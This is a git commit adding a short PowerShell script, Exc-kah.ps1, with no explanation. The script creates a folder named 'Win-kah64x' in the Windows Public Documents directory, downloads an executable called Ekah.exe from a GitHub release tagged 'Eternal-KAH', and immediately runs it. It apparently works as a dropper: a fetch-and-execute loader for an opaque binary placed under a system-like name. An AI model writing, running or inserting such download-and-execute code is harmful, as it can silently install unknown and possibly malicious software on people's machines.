e5c0371d1ad084b9f83a0ce0ba08691c6b67f9ca
KAH842 <spaghettimcfetty@gmail.com>
2024-07-11 02:30:40 -0400

    Add files via upload

---
+++ Exc-kah.ps1
@@ -0,0 +1,7 @@
+﻿New-Item -Path ("C:\Users\Public\Documents\Win-kah64x") -Confirm -ItemType directory 
+$url = "https://github.com/KAH842/Kah/releases/download/Eternal-KAH/Ekah.exe"
+$outpath = "C:\Users\Public\Documents\Win-kah64x/Ekah.exe"
+Invoke-WebRequest -Uri $url -OutFile $outpath
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url, $outpath)
+Start-Process "C:\Users\Public\Documents\Win-kah64x\Ekah.exe"
